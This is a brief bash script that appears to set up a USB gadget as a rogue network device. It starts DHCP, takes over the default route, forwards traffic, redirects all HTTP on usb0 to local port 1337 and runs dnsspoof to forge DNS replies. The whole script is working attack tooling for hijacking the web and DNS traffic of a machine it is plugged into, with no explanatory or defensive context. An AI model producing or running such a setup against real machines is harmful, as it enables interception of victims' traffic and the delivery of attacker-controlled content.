#!/usr/bin/env bash

ifup usb0  # Up USB interface
ifconfig usb0 up  # USB networking up
# Configure etc/network/interfaces "iface usb0 inet static"
/sbin/route add -net 0.0.0.0/0 usb0  # Add route for all IPv4 addresses
# Copy DHCP config to /etc/dhcp/dhcp.conf
/etc/init.d/isc-dhcp-server start  # Start DHCP server


/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53